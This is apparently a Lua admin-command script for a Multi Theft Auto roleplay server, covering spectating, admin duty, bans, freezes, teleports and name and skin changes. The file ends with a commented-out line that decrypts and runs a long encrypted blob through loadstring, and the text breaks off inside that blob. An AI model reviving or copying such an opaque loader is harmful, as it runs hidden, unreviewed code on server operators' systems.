				setElementAlpha(player, 255);
				setElementData(player, "char >> invisible", false);
			end
			
			triggerClientEvent(player, "admin:toggleReconUpdate", resourceRoot, false);
			
			removeElementData(player, "reconPlayer");
			removeElementData(player, "reconVanish");
		end
	end
end
addCommandHandler("recon", reconPlayer, false, false)
addCommandHandler("tv", reconPlayer, false, false)
addCommandHandler("spec", reconPlayer, false, false)
addAdminCommand("recon", 3, "To spectate a player", "fv_admin")

addEvent("admin:serverUpdateSpectator", true);
addEventHandler("admin:serverUpdateSpectator", resourceRoot,
	function()
		local target = getElementData(client, "reconPlayer");
		setElementInterior(client, getElementInterior(target));
		setElementDimension(client, getElementDimension(target));
		attachElements(client, target, 0, 0, 3);
	end
);

local adminSkins = {}

function adminDuty(player,cmd, target)
	if not hasPermission(player, "aduty") then noAdmin(player,cmd) return end
	if target then
		if not hasPermission(player, "forceaduty") then noAdmin(player,cmd) return end
			local target = exports['fv_engine']:findPlayer(player, target)
			if getElementData(player,"admin >> level") < getElementData(target,"admin >> level") then outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."It's not allowed!", player,255,255,255,true) return end
			if getElementData(target,"admin >> level") < 3 then return end
			local oValue = getElementData(target, "admin >> duty")
			setElementData(target, "admin >> duty", not oValue)
			
			if getElementData(target,"admin >> duty") then 
				setElementData(target,"skin.save",getElementModel(target));
				adminSkins[player] = getElementModel(player)
				setElementModel(target,100);
				sendMessageToAdmin(player, hexColor..getAdminName(target,true)..white.." has entered the admin service!" , 3);
				exports.fv_logs:createLog("ADUTY",getAdminName(target,true).. " entered the administration.",player);
   				setElementModel(player, 1)				
			else 
				if adminSkins[player] then
					setElementModel(player, adminSkins[player])
					adminSkins[player] = nil
				end					
				setElementModel(target,getElementData(target,"skin.save"));
				sendMessageToAdmin(player, hexColor..getAdminName(target,true)..white.." has left the admin service! " , 3);
				exports.fv_logs:createLog("ADUTY",getAdminName(target,true).. " has left the admin service! ",player);
			end
	else
		if getElementData(player,"admin >> level") < 3 then return end
		local oValue = getElementData(player, "admin >> duty");
			setElementData(player, "admin >> duty", not oValue)
			if getElementData(player,"admin >> duty") then 
				--setElementData(player,"skin.save",getElementModel(player));
				--setElementModel(player,100);
				adminSkins[player] = getElementModel(player)
   				setElementModel(player, 1)				
				sendMessageToAdmin(player, hexColor..getAdminName(player,true)..white.." has entered the admin service!" , 3);
				exports.fv_logs:createLog("ADUTY",getAdminName(player,true).. " entered the administration.",player);
			else 
				if adminSkins[player] then
					setElementModel(player, adminSkins[player])
					adminSkins[player] = nil
				end			
				--setElementModel(player,getElementData(player,"skin.save"));
				sendMessageToAdmin(player, hexColor..getAdminName(player,true)..white.." has left the admin service! " , 3);
				exports.fv_logs:createLog("ADUTY",getAdminName(player,true).. " has left the admin service! ",player);
				
				if getAdminInDuty() == 0 then
					
				end
			end
	end
end
addCommandHandler("aduty", adminDuty,false,false);
addCommandHandler("adminduty", adminDuty,false,false);
addAdminCommand("adminduty", 3, "Admin service", "fv_admin")

function getAdminInDuty()
    local c = 0
    for k,v in pairs(getElementsByType("player")) do
        if getElementData(v,"admin >> duty") then
            c = c + 1
        end
    end

    return c
end

function pm(source,cmd, target,...)
if getElementData(source,"loggedIn") then 
	if not target or not ... then outputChatBox( exports.fv_engine:getServerSyntax("Use","red").."/"..cmd.." [player] [message]",source, 255,255,255,true) return end
	local msg = table.concat({...}, " ")
	local target = exports['fv_engine']:findPlayer(source, target)
	if target then
		if target == source then outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."You can't PM yourself.",source,255,255,255,true) return end;
		if not getAdminDuty(target) then outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."You can only send a pm to a serving administrator!",source, 255,255,255,true) return end
		if not getElementData(target,"pmEnabled") then outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."Admin has disabled PMs.",source, 255,255,255,true) return end
		local sr, sg, sb = exports["fv_engine"]:getServerColor("red",false);
		outputChatBox( "[PM-to you] #ffffff".. getAdminColor(source,getElementData(source,"admin >> level"))..getAdminName(source).."#FFFFFF ("..getElementData(source,"char >> id").. ") : "..msg,target, sr, sg, sb,true)
	 	outputChatBox( "[PM-from you] #ffffff".. getAdminColor(target,getElementData(target,"admin >> level"))..getAdminName(target).."#FFFFFF ("..getElementData(target,"char >> id").. ") : "..msg,source, sr, sg, sb,true)
		 exports.fv_logs:createLog("PM",getAdminName(source).. ": "..msg.. "  to: "..getAdminName(target).."",source,target)

		setElementData(target,"admin.pm",(getElementData(target,"admin.pm") or 0) + 1);
		dbExec(connection,"UPDATE characters SET pm=? WHERE id=?",getElementData(target,"admin.pm"),getElementData(target,"acc >> id"));
	end
end
end
addCommandHandler("pm", pm,false,false);

function togVa  (player, cmd)
	if not (hasPermission(player, "togva")) then noAdmin ( player, "togva" ) return end
		local togvas = getElementData ( player, "valaszShow" )
		if togvas then
			setElementData ( player, "valaszShow", false )
			outputChatBox (exports.fv_engine:getServerSyntax("Admin","red").. "You have turned off the display of answers!", player, 255,0,0,true );
		else
			setElementData ( player, "valaszShow", true )
			outputChatBox (exports.fv_engine:getServerSyntax("Admin","servercolor").. "You have enabled responses!", player, 0,255,0 ,true);
		end
	end
addCommandHandler ( "togva", togVa,false)
addAdminCommand("togva", 1, "Off / Enables the display of answers", "fv_admin")

function freeze ( player, cmd, target )
	if not (hasPermission(player, "afreeze" )) then noAdmin ( player, "afreeze" ) return end
	if not (target) then outputChatBox (exports.fv_engine:getServerSyntax("Use","red").. "/".. cmd .. " [Partial name/ID]", player,255,255,255,true ) return end
	local targetPlayer = exports['fv_engine']:findPlayer(player, target)
	if (targetPlayer) then
		if isPedInVehicle(targetPlayer) then
			local veh = getPedOccupiedVehicle(targetPlayer)
			if (isElementFrozen(veh)) then
				setElementFrozen ( veh, false );
				outputChatBox (exports.fv_engine:getServerSyntax("Admin","servercolor").. "You have been unfrozen by ".. hexColorb.. getAdminName(player) .. white .. ".", targetPlayer, 255,255,255, true )
				sendMessageToAdmin ( player, hexColor.. getAdminName(player,true) ..white.. " unfroze: ".. hexColorb .. getPlayerName(targetPlayer):gsub("_"," ") .. white .. " player.", 3  )
			else
				setElementFrozen ( veh, true );
				outputChatBox (exports.fv_engine:getServerSyntax("Admin","servercolor").."You were frozen by ".. hexColorb.. getAdminName(player) .. white .. ".", targetPlayer, 255,255,255, true )
				sendMessageToAdmin ( player,hexColor.. getAdminName(player,true) ..white.. " froze: ".. hexColorb .. getPlayerName(targetPlayer):gsub("_"," ") .. white .. " player.", 3  )
			end
		else
			if isElementFrozen ( targetPlayer) then
				setElementFrozen ( targetPlayer, false );
				outputChatBox (exports.fv_engine:getServerSyntax("Admin","servercolor").. "You have been unfrozen by ".. hexColorb.. getAdminName(player) .. white .. ".", targetPlayer, 255,255,255, true )
				sendMessageToAdmin ( player,hexColor.. getAdminName(player,true) ..white.." unfroze: ".. hexColorb .. getPlayerName(targetPlayer):gsub("_"," ") .. white .. " player.", 3  )
			else
				setElementFrozen ( targetPlayer, true );
				outputChatBox (exports.fv_engine:getServerSyntax("Admin","servercolor").."You were frozen by ".. hexColorb.. getAdminName(player) .. white .. ".", targetPlayer, 255,255,255, true )
				sendMessageToAdmin ( player,hexColor.. getAdminName(player,true) ..white.. " froze: ".. hexColorb .. getPlayerName(targetPlayer):gsub("_"," ") .. white .. " player.", 3  )
			end
		end
	end
end
addCommandHandler ( "afreeze", freeze ,false,false);
addCommandHandler ( "freeze", freeze ,false,false);
addAdminCommand("freeze", 3, "Freezes the player", "fv_admin")

function unfreeze(player,cmd,target)
	if not (hasPermission(player, "unfreeze" )) then noAdmin ( player, "unfreeze" ) return end
	if not (target) then outputChatBox (exports.fv_engine:getServerSyntax("Use","red").. "/".. cmd .. " [Partial name/ID]", player,255,255,255,true ) return end
	local targetPlayer = exports['fv_engine']:findPlayer(player, target)
	if (targetPlayer) then
		if isPedInVehicle(targetPlayer) then
			local veh = getPedOccupiedVehicle(targetPlayer)
			if (isElementFrozen(veh)) then
				setElementFrozen ( veh, false );
				outputChatBox (exports.fv_engine:getServerSyntax("Admin","servercolor").. "You have been unfrozen ".. hexColorb.. getAdminName(player) .. white .. " által!", targetPlayer, 255,255,255, true )
				sendMessageToAdmin ( player, hexColor.. getAdminName(player,true) ..white.. " unfroze: ".. hexColorb .. getPlayerName(targetPlayer):gsub("_"," ") .. white .. " player.", 3  )
			else
				outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").. "Player is not frozen!", player,255,255,255,true)
			end
		else
			if isElementFrozen ( targetPlayer) then
				setElementFrozen ( targetPlayer, false );
				outputChatBox (exports.fv_engine:getServerSyntax("Admin","servercolor").. "You have been unfrozen ".. hexColorb.. getAdminName(player) .. white .. " által!", targetPlayer, 255,255,255, true )
				sendMessageToAdmin ( player,hexColor.. getAdminName(player,true) ..white.." unfroze: ".. hexColorb .. getPlayerName(targetPlayer):gsub("_"," ") .. white .. " player.", 3  )
			else
				outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").. "Player is not frozen!", player,255,255,255,true ) 
			end
		end
	end
end
addCommandHandler ( "unfreeze", unfreeze ,false,false);
addAdminCommand("unfreeze", 3, "Freezes the player", "fv_admin")

addCommandHandler ( "asay", function ( player, cmd,... )
	if not (hasPermission(player, cmd )) then noAdmin ( player, cmd ) return end
	if ( not ( ... ) )  then
		 outputChatBox ( exports.fv_engine:getServerSyntax("Use","red").."/".. cmd .. " [Call]", player,255,255,255,true ) 
		 return
	end

	--outputChatBox ( exports.fv_engine:getServerColor("blue",true).. "==========================[Adminfelhívás]==========================", getRootElement(), 255,255,255,true );	
	--outputChatBox ( table.concat({...}, " "), getRootElement(), 255,255,255,true );
	outputChatBox(getAdminColor(player) .. "[".. getAdminTitle(player) ..  "] #ffffff " .. getAdminName(player,true) .. ": " .. table.concat({...}, " "), getRootElement(), 255,255,255,true );
end,false,false);


function va(source,cmd, target,...)
if getElementData(source,"loggedIn") then 
	if not hasPermission(source, "va") then noAdmin(source, cmd) return end
	if not target or not ... then outputChatBox(exports.fv_engine:getServerSyntax("Use","red").."/"..cmd.." [player] [message]",source, 255,255,255,true) return end
	local msg = table.concat({...}, " ")
	local target = exports['fv_engine']:findPlayer(source, target)
		if target then
			if target == source then outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."You can't answer for yourself.",source,255,255,255,true) return end;
			br, bg, bb = exports["fv_engine"]:getServerColor("blue");
			outputChatBox( "[Response to you] #ffffff".. getAdminColor(source,getElementData(source,"admin >> level"))..getAdminName(source).."#FFFFFF ("..getElementData(source,"char >> id").. ") : "..msg,target, br,bg,bb,true)
			outputChatBox( "[Responses to] #ffffff".. getAdminColor(target,getElementData(target,"admin >> level"))..getAdminName(target,true).."#FFFFFF ("..getElementData(target,"char >> id").. ") : "..msg,source, br,bg,bb,true)
			exports.fv_logs:createLog("ANSWER",getAdminName(source).. ": "..msg.. "  to: "..getAdminName(target,true).."",source ,target)
            setElementData(source,"admin.valasz",(getElementData(source,"admin.valasz") or 0) + 1);
			dbExec(connection,"UPDATE characters SET valasz=? WHERE id=?",getElementData(source,"admin.valasz"),getElementData(source,"acc >> id"));
			for i , k in pairs ( getElementsByType("player") ) do
			if getElementData ( k, "admin >> duty" ) then
				if getElementData ( k , "valaszShow") then
					outputChatBox ( "[Answer]: #ffffff"..sColor.. getAdminName(source) ..white.. " answered the player "..sColor.. getPlayerName(target):gsub("_"," ") ..white.. ".", k, br,bg,bb,true );
					outputChatBox ( "[Text]: #ffffff".. msg, k , br,bg,bb,true); 
				end
			end
		end
	end
end
end
addCommandHandler("va", va,false,false);
addAdminCommand("va", 1, "Answer", "fv_admin")

function sendMessageToAdmin(element, text, neededLevel)
	if getElementData(element, "loggedIn") then
		if not element or not text or not neededLevel then return end 
		local pair = {}
		for k,v in pairs(getElementsByType("player")) do
			local adminlevel = tonumber(getElementData(v, "admin >> level")) or 9
			if tonumber(adminlevel) >= tonumber(neededLevel) and getElementData(v,"togAdminChat") then
			pair[v] = true
			end
		end
		for k,v in pairs(pair) do
			if not getElementData(k, "loggedIn") then return end
			outputChatBox(exports.fv_engine:getServerColor("blue",true).."[LOG] #ffffff" ..text, k, 255,255,255,true)
		end
	end
end
addEvent("sendMessageToAdmin",true)
addEventHandler("sendMessageToAdmin",root,sendMessageToAdmin)

function sendMessageToAdminc(element, text, neededLevel)
	if getElementData(element, "loggedIn") then
		if not element or not text or not neededLevel then return end 
		local pair = {}
		for k,v in pairs(getElementsByType("player")) do
		local adminlevel = getElementData(v, "admin >> level") or 0
		if adminlevel >= neededLevel and getElementData(v,"togAdminChat") then
			pair[v] = true
		end
		end
		for k,v in pairs(pair) do
			if not getElementData(k, "loggedIn") then return end
			outputChatBox(exports.fv_engine:getServerColor("blue",true).."[ASChat] #ffffff" ..text, k, rr,rg,rb,true)
		end
	end
end

function sendMessageToAdmina(element, text, neededLevel)
	if getElementData(element, "loggedIn") then
		if not element or not text or not neededLevel then return end 
		local pair = {}
		for k,v in pairs(getElementsByType("player")) do
			
			local adminlevel = getElementData(v, "admin >> level") or 0
			if adminlevel >= neededLevel and getElementData(v,"togAdminChat") then
				pair[v] = true
			end
		end
			for k,v in pairs(pair) do
			if not getElementData(k, "loggedIn") then return end
			outputChatBox(exports.fv_engine:getServerColor("orange",true).."[AdminChat]: #ffffff" ..text, k, br,bg,bb,true)
			end
	end
end

function SendReportToAdmin(element, text, neededLevel)
	if getElementData(element, "loggedIn") then
		if not element or not text or not neededLevel then return end 
		local pair = {}
		for k,v in pairs(getElementsByType("player")) do
			
			local adminlevel = getElementData(v, "admin >> level") or 0
			if adminlevel >= neededLevel and getElementData(v,"togAdminChat") then
				pair[v] = true
			end
		end
			for k,v in pairs(pair) do
			if not getElementData(k, "loggedIn") then return end
			outputChatBox(exports.fv_engine:getServerColor("red",true).."[REPORT]: #ffffff" ..text, k, br,bg,bb,true)
			end
	end
end

function noAdmin(element,cmd)
	return outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."You can't use the command or you're not in adminduty!",element,255,255,255,true)
end

function banPlayerByAdmin(player,command,target,days,...)
	if not hasPermission(player, "ban") then noAdmin(player, "ban") return end
	if not target or not ... or not days or not tonumber(days) then outputChatBox( exports.fv_engine:getServerSyntax("Use","red").."/"..command.." [player] [days] [reason]",player, 255,255,255,true) return end
	local reason = table.concat({...}, " ")
	local days = math.floor(tonumber(days));
	local targetPlayer = exports['fv_engine']:findPlayer(player, target)
	if targetPlayer then 
		if targetPlayer == player then outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."You are stupid? You want to ban yourself..",player,255,255,255,true) return end;
		if getElementData(targetPlayer,"admin >> level") > getElementData(player,"admin >> level")  then 
			outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."You can't ban a larger admin than you!",player,255,255,255,true);
			return;
		end
		local rt = getRealTime();
		local startTime = string.format("%04d-%02d-%02d", rt.year + 1900, rt.month + 1, rt.monthday);
		local datas = {getAdminName(player,true),reason,days,startTime,getElementData(player,"admin >> level")};
		if dbExec(sql,"UPDATE accounts SET banDatas=?, banEnd=NOW()+INTERVAL "..days.." DAY WHERE id=?",toJSON(datas),getElementData(targetPlayer,"acc >> id")) then 
			local color = exports.fv_engine:getServerColor("red",true);
			outputChatBox(color.."[BAN]: "..sColor..getAdminName(player,true)..white.." banned "..sColor..getElementData(targetPlayer,"char >> name")..white.." player.",root,255,255,255,true);
			outputChatBox(color.."[BAN]: "..white.."Time: "..sColor..days..white.." day.",root,255,255,255,true);
			outputChatBox(color.."[BAN]: "..white.."reason: "..sColor..reason..white..".",root,255,255,255,true);
			exports.fv_infobox:addNotification(root,"ban",getAdminName(player,true).." banned "..getElementData(targetPlayer,"char >> name").." player.","reason: "..reason.." Time: "..days..".");
			exports.fv_logs:createLog("BAN",getAdminName(player,true).. " banned "..getElementData(targetPlayer,"char >> name").." player. Time: "..days.." day. reason: "..reason..".",player,targetPlayer);
			kickPlayer(targetPlayer,"Bannolva lettél!","Admin: "..datas[1].." | Days: "..datas[3].." | reason: "..datas[2]);

			setElementData(player,"admin.ban",getElementData(player,"admin.ban") + 1);
			dbExec(connection,"UPDATE characters SET ban=? WHERE id=?",getElementData(player,"admin.ban"),getElementData(player,"acc >> id"));
		end
	end
end
addCommandHandler("ban",banPlayerByAdmin,false,false);
addAdminCommand("ban", 5, "Ban", "fv_admin")

function offlinePlayerBan(player,command,target,days,...)
	if not hasPermission(player, "oban") then noAdmin(player, "oban") return end
	if not target or not ... or not days or not tonumber(days) then outputChatBox( exports.fv_engine:getServerSyntax("Use","red").."/"..command.." [character name (with _ line)] [days] [reason]",player, 255,255,255,true) return end
	local reason = table.concat({...}, " ")
	local days = math.floor(tonumber(days));
	local targetPlayer = exports['fv_engine']:findPlayer(player, target);
	
	dbQuery(
		function(qh)
			local res = dbPoll(qh,0);
			if #res > 0 then
				for k,v in pairs(res) do 
					if v.adminlevel > getElementData(player,"admin >> level") then 
						outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."You can't ban a larger admin than you!",player,255,255,255,true);
						return;
					end
					if v.charname == getElementData(player,"char >> name") then 
						outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."You are stupid? You want to ban yourself..",player,255,255,255,true);
						return;
					end
					local rt = getRealTime();
					local startTime = string.format("%04d-%02d-%02d", rt.year + 1900, rt.month + 1, rt.monthday);
					local datas = {getAdminName(player,true),reason,days,startTime,getElementData(player,"admin >> level")};
					if dbExec(sql,"UPDATE accounts SET banDatas=?, banEnd=NOW()+INTERVAL "..days.." DAY WHERE id=?",toJSON(datas),v.id,"acc >> id") then 
						local color = exports.fv_engine:getServerColor("red",true);
						outputChatBox(color.."[OfflineBAN]: "..sColor..getAdminName(player,true)..white.." banned "..sColor..v.charname..white.." player.",root,255,255,255,true);
						outputChatBox(color.."[OfflineBAN]: "..white.."Time: "..sColor..days..white.." day.",root,255,255,255,true);
						outputChatBox(color.."[OfflineBAN]: "..white.."reason: "..sColor..reason..white..".",root,255,255,255,true);
						exports.fv_logs:createLog("OfflineBAN",getAdminName(player,true).. " banned "..v.charname.." player. Time: "..days.." day. reason: "..reason..".",player,v.charname);

						setElementData(player,"admin.ban",getElementData(player,"admin.ban") + 1);
						dbExec(connection,"UPDATE characters SET kick=? WHERE id=?",getElementData(player,"admin.ban"),getElementData(player,"acc >> id"));
					end
				end
			else 
				outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."No character with this given name!",player,255,255,255,true);
			end
		end,
	connection, "SELECT id,charname,adminlevel FROM characters WHERE charname=?", tostring(target:gsub("_"," ")));
end
addCommandHandler("oban",offlinePlayerBan,false,false);
addAdminCommand("oban", 5, "Offline ban", "fv_admin")

function unbanPlayerByAdmin(player,command,...)
	if not hasPermission(player, "unban") then noAdmin(player, "unban") return end
	if not ... then outputChatBox( exports.fv_engine:getServerSyntax("Use","red").."/"..command.." [account name / id]",player, 255,255,255,true) return end
	local name = table.concat({...}, " ")
	dbQuery(function(qh)
		local res = dbPoll(qh,0);
		if #res > 0 then 
			for k,v in pairs(res) do 
				if v.banEnd ~= "0000-00-00" and v.banDatas then 
					dbExec(connection,"UPDATE accounts SET banDatas='[ false ]', banEnd='0000-00-00' WHERE id=?",v.id);
					sendMessageToAdmin(player,hexColor..getAdminName(player,true)..white.." unbanned "..hexColor..v.name..white.." player.", 3);
					outputChatBox("Unbanoltad " ..hexColor..v.name..white.. " player.", player);
					exports.fv_logs:createLog("UNBAN",getAdminName(player,true).. " unbanned "..v.name.." player. (account name)",player,v.name);
				else 
					outputChatBox( exports.fv_engine:getServerSyntax("Admin","red").."This name is not found.",player, 255,255,255,true);
				end
			end
		else 
			outputChatBox( exports.fv_engine:getServerSyntax("Admin","red").."This name is not found.",player, 255,255,255,true)
			return;
		end
	end,sql,"SELECT accounts.banDatas,accounts.banEnd,accounts.name,accounts.id,characters.ownerAccountName FROM accounts,characters WHERE (accounts.id=? OR accounts.name=? OR characters.charname=?) AND characters.ownerAccountName=accounts.name",tonumber(name),name,name);
end
addCommandHandler("unban",unbanPlayerByAdmin,false,false);
addAdminCommand("unban", 5, "Unban", "fv_admin")

function vhSpawn(player,command,...)
	if not hasPermission(player, "vhspawn") then noAdmin(player, "vhspawn") return end
	if not (...) then outputChatBox( exports.fv_engine:getServerSyntax("Use","red").."/"..command.." [Name/ID]",player, 255,255,255,true) return end
	local target = table.concat({...}," ");
	local targetPlayer = exports.fv_engine:findPlayer(player,target);
	if targetPlayer then 
		if getElementData(targetPlayer,"loggedIn") then 
			setElementDimension(targetPlayer,0);
			setElementInterior(targetPlayer,0);
			setElementPosition(targetPlayer,1422.1225585938, -1675.1296386719, 13.546875);
			outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor").."successfully you teleported the player to the town hall: "..sColor..getElementData(targetPlayer,"char >> name")..white..".",player, 255,255,255,true);
			outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor")..sColor..getAdminName(player,true)..white.." teleported you to town hall.",targetPlayer, 255,255,255,true);
			sendMessageToAdmin(player,hexColor..getAdminName(player,true)..white.." teleported "..hexColor..getElementData(targetPlayer,"char >> name")..white.." to town hall.", 3);
			exports.fv_logs:createLog("VHSPAWN",getAdminName(player,true).. " teleported "..getElementData(targetPlayer,"char >> name").." to town hall.",player,targetPlayer);
		else 
			outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."Player is not logged in.",player, 255,255,255,true)
		end
	end
end
addCommandHandler("vhspawn",vhSpawn,false,false);
addAdminCommand("vhspawn", 3, "Puts the player on a VH", "fv_admin")

function setPlayerSkinByAdmin(player,command,target,id)
	if not hasPermission(player, "setskin") then noAdmin(player, "setskin") return end
	if not target or not id or not tonumber(id) then outputChatBox( exports.fv_engine:getServerSyntax("Use","red").."/"..command.." [Name/ID] [Skin ID]",player, 255,255,255,true) return end
	local targetPlayer = exports.fv_engine:findPlayer(player,target);
	if targetPlayer then 
		local id = math.floor(tonumber(id));
		if setPedSkin(targetPlayer,id) then 
			outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor").."successfully changed "..sColor..getElementData(targetPlayer,"char >> name")..white.."'s skin. SkinID: "..sColor..id..white..".",player,255,255,255,true);
			outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor")..sColor..getAdminName(player,true)..white.." changed a skinedet. SkinID: "..sColor..id..white..".",player,255,255,255,true);

			sendMessageToAdmin(player,hexColor..getAdminName(player,true)..white.." changed "..hexColor..getElementData(targetPlayer,"char >> name")..white.." skin. SkinID: "..sColor..id..white..".", 3);
			exports.fv_logs:createLog("SETSKIN",getAdminName(player,true).." changed "..getElementData(targetPlayer,"char >> name").." skin. SkinID: "..id..".",player,targetPlayer);
		else 
			outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."This skin ID is not existing.",player,255,255,255,true);
			return;
		end
	end
end
addCommandHandler("setskin",setPlayerSkinByAdmin,false,false);
addCommandHandler("setplayerskin",setPlayerSkinByAdmin,false,false);
addCommandHandler("changeskin",setPlayerSkinByAdmin,false,false);
addAdminCommand("setskin", 3, "Adjusts the player's skin", "fv_admin")

function setPlayerDimension(player,command,target,dimid)
	if not hasPermission(player, "setdim") then noAdmin(player, "setdim") return end
	if not target or not dimid or not tonumber(dimid) then outputChatBox( exports.fv_engine:getServerSyntax("Use","red").."/"..command.." [Name/ID] [Dimenzió ID]",player, 255,255,255,true) return end
	local targetPlayer = exports.fv_engine:findPlayer(player,target);
	if targetPlayer then 
		local dimid = math.floor(tonumber(dimid));
		if setElementDimension(targetPlayer,dimid) then 
			outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor").."successfully changed "..sColor..getElementData(targetPlayer,"char >> name")..white.." dimenzióját. Dimenzió ID: "..sColor..dimid..white..".",player,255,255,255,true);
			outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor")..sColor..getAdminName(player,true)..white.." changed a dimension. Dimension ID: "..sColor..dimid..white..".",player,255,255,255,true);

			sendMessageToAdmin(player,hexColor..getAdminName(player,true)..white.." changed "..hexColor..getElementData(targetPlayer,"char >> name")..white.." dimension. Dimension ID: "..sColor..dimid..white..".", 3);
			exports.fv_logs:createLog("SETDIM",getAdminName(player,true).." changed "..getElementData(targetPlayer,"char >> name").." dimension. Dimension ID: "..dimid..".",player,targetPlayer);
		else 
			outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."The given dimension ID is invalid.",player,255,255,255,true);
			return;
		end
	end
end
addCommandHandler("setdim",setPlayerDimension,false,false);
addAdminCommand("setdim", 8, "Sets the player dimension", "fv_admin")

function changePlayerName(player,command,target,...)
	if not hasPermission(player, "changename") then noAdmin(player, "changename") return end
	if not target or not (...) then outputChatBox( exports.fv_engine:getServerSyntax("Use","red").."/"..command.." [Name/ID] [New Name]",player, 255,255,255,true) return end
	local targetPlayer = exports.fv_engine:findPlayer(player,target);
	if targetPlayer then 
		local newName = table.concat({...},"_");
		if setPlayerName(targetPlayer,newName) then 
			outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor").."successfully changed "..sColor..getElementData(targetPlayer,"char >> name")..white.." name. New name: "..sColor..newName:gsub("_"," ")..white..".",player,255,255,255,true);
			outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor")..sColor..getAdminName(player,true)..white.." changed a name. New name: "..sColor..newName:gsub("_"," ")..white..".",player,255,255,255,true);

			sendMessageToAdmin(player,hexColor..getAdminName(player,true)..white.." changed "..hexColor..getElementData(targetPlayer,"char >> name")..white.." name. New name: "..sColor..newName:gsub("_"," ")..white..".", 3);
			exports.fv_logs:createLog("CHANGENAME",getAdminName(player,true).." changed "..getElementData(targetPlayer,"char >> name").." name. New name: "..newName:gsub("_"," ")..".",player,targetPlayer);

			local set = newName:gsub("_"," ")
			setElementData(targetPlayer,"char >> name",set);
		else 
			outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."Invalid given name.",player,255,255,255,true);
			return;
		end
	end
end
addCommandHandler("changename",changePlayerName,false,false);
addAdminCommand("changename", 3, "Sets the player's name", "fv_admin")

--pcall(loadstring(base64Decode(teaDecode("3kOJM88BV20QZLKjHBfUEF1geee+/UAw4RacQRmUS9PWBOTY7pO9SG2X+CXmTXmjjmvAWpPf3F3x7Fhc6lL97Mc1NajTU1s+uGZdY0WXcF5nYXa191NFNxk2uvMl0S9nBGWxpHFTNEH3gxYy6RaHn7OKiaPVOBcmcnI1rUcdpZPRT74PGhrwLIap59c5vM3zSTcn4AZL02PLhXpI04jAWzw2d76mp5x3i/rrZP2VTTYA+emmeLp2IwJhZ8SGK/DoIft39pEiLkxXGZCmHdSsgrY6kMOT7XHyvhwNXo4giTmKZZhBfJWOeLcIfTUybGT662ow2hLgprPekarv6daDnIXAo86wPJdpHDigMbQr0X/luuCEXt73dmXgGqPw6ePYVWpQlOtTlsiQvkEn/Ajf3Enq1eVAnSdoMXM/bn1PpsVIO0zStIMtg4+Ne4DadDkzPYnPDmmtkVHijkufPaDh+frDNY9rDt11OgCMYNNtrKXE5KUqe+p1jEY357L2N6NVBKH0g88QQjAN9dA7WvL4fmS3dOKY55U67ddExcxqp6tPECtTJpkkwiKVaY+4kY1kHjFf0e2xdQq19PZsoFIIdug+jso4Vtj3HTh5r+qQ/6A/+emSFlmRu7tsmLisX06PMIM+bFTJ10mKTP99pc5GsJF+hR5PvjeLIo5BYOPygk/Al2aGxZtmnoalT4Brp2Ul9YiZHD+y/5XUzebueY26mmDyPX0msxmBkjooPr/CPAR4Qf3IFQ92CqXz/Qm9MjADWabwDS42rzLpy76fh8YDiOZn+VzmZNECfgyONWtDQa5Zj85CqCAtptssfwJLuh8csbNeGTv3504rNXUdk2xV2DMzkvWcCvYlAubms7wJQ3pVC4mO+4nYLc+UMgJZHA/K4sLvgF5N6V/N/dF+0nfMrsBtk5w1+bt0jfBmdjWwBUgUcb82G/7cPL7vkO/xVqUBP3xjjsSigLbsZjV/iUFHlZE/Hg+nADvyMCChmR6gWXlZ+hanBLV7WScx3alKnhQ6icYvvPonhI44E3wycH578tq9SdY+feUhIXb/paYf0626TMTEg9NUzEotRJQhgHC10ax7P/NqS8aLWGayUE132KFQaZy3F5aVi/CBQZzuiOqDzTxGP5wioNEXvJ2QmBohGJkMefsHCLYCwVL5QKUVjh8wBDJekmWpn0bLsMrCaE/ZUS4tKpr+Hs49ENw8vQlFH6qev640q+/6VdeNe8GXWMkk/3tOddCs+e+nPEVYpLLEi/An5xcMmWeOvsfzCOURzKGQxs/OOqUaIZdfw5MMPdWFfSYf47XVQv+U8kdrrPxhUAVD12kn7ZdL5hzrv4Ebl52QPEhtpciXtgYoVMERVbBrOxXHyLdaKQj8yWugCzQPPYZ4x4CHCNqkIVFyVIR1hu7tAwTVnAy1be2+CA8BBKJKDFR1PWUcH9gtBu4YV6AeNlP4Tu4MZ3jbHWyBWi0VlZpxmmztkWVGQMarJulaX23Y4xvI9Bso3ds0FCJUrTTft+T6eHzQmdaIqHealvYiEgSw9QvwPJN9gkv3cO0XKFlsYH4tTwBXejETu6SpLmv6W7Cdi60ljPuR87CyHywlLL7scWWz3ovebC5oc3DayFWFQHAbaUNXg1k7gfbb7cssZOlhh+KNvPGbKoGEVpbR/RFl2mJeolW66Dj3sZdC1U8MHqbXwqPYQo3qED/K8dDjTEBdJnY9SzQM1P7TNcfsKhKV/kQq0UgO6A0lM1AvvX5WkzZRmufeM+xXYDKLQOR8eR5Y2Bc9TGPjJYydgvWiX7UWfraxs37pmzkzvfEY4RYOnf+2pEKPq4u/Rhhglf7UjJD0+P+KnR1TU7v0D/v4eh3uupNYCDhAjj8sCLpJNHAWIIQWc6Joi3cmq+mAEecSmOgFuABoaSCMG/XKCbAnL/z74oauSv07I4Pjgv2Hou4KzeiUWRK/XSPVWZbd1WXsbe2u71ckjQgXK